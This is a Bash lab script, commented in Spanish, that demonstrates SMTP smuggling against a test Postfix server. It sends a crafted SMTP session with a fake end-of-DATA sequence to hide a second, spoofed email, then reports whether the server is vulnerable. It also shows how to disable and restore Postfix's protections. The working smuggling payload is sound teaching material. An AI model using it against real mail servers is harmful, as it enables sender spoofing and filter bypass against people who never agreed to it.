#!/bin/bash
# =====================================================================
#  PC 2 (o el mismo PC en casa): demo de SMTP smuggling por el puerto 25.
#  Esconde un segundo correo ("CONTRABANDO") dentro del primero, detrás
#  de un fin de DATA falso <LF>.<CR><LF>.
#
#  Demo "antes" (en el PC 1, desactivar la protección temporalmente):
#    docker compose exec mail postconf -e smtpd_forbid_bare_newline=no smtpd_forbid_unauth_pipelining=no
#    docker compose exec mail postfix reload
#  -> este script muestra DOS correos aceptados (el escondido pasó).
#
#  Demo "después" (restaurar la configuración del repositorio):
#    docker compose restart mail
#  -> UN solo correo aceptado: el texto escondido queda dentro del primero.
# =====================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
HOST=${HOST:-mail.lab.test}
mkdir -p evidencias
OUT=evidencias/demo-smuggling-$(date +%Y%m%d-%H%M%S).txt

{
  sleep 1
  for c in "EHLO pc2.lab.test" "MAIL FROM:<alguien@otro.test>" "RCPT TO:<pedro@lab.test>" "DATA"; do
    printf '%s\r\n' "$c"; sleep 1
  done
  printf 'From: <alguien@otro.test>\r\nTo: <pedro@lab.test>\r\nSubject: Correo visible\r\n\r\nTexto legitimo.\r\n'
  printf '\n.\r\n'      # <-- fin de DATA FALSO (LF en vez de CRLF antes del punto)
  printf 'MAIL FROM:<ventas@otro.test>\r\nRCPT TO:<pedro@lab.test>\r\nDATA\r\n'
  printf 'From: <ventas@otro.test>\r\nTo: <pedro@lab.test>\r\nSubject: Correo de CONTRABANDO\r\n\r\nEste correo no deberia existir.\r\n'
  printf '\r\n.\r\n'    # <-- fin de DATA real
  sleep 3; printf 'QUIT\r\n'; sleep 1
} | timeout 40 nc -w 8 "$HOST" 25 | sed 's/^/S: /' | tee "$OUT"

n=$(grep -cE "^S: 250 .*queued" "$OUT")
echo
if [ "$n" -ge 2 ]; then
  echo -e "\e[31m>> VULNERABLE: el servidor aceptó $n correos. El 'CONTRABANDO' llegó como correo aparte.\e[0m"
else
  echo -e "\e[32m>> PROTEGIDO: un solo correo aceptado. El texto escondido quedó dentro del primero.\e[0m"
fi
echo "   Revisen el buzón de Pedro en Thunderbird. Evidencia: $OUT"
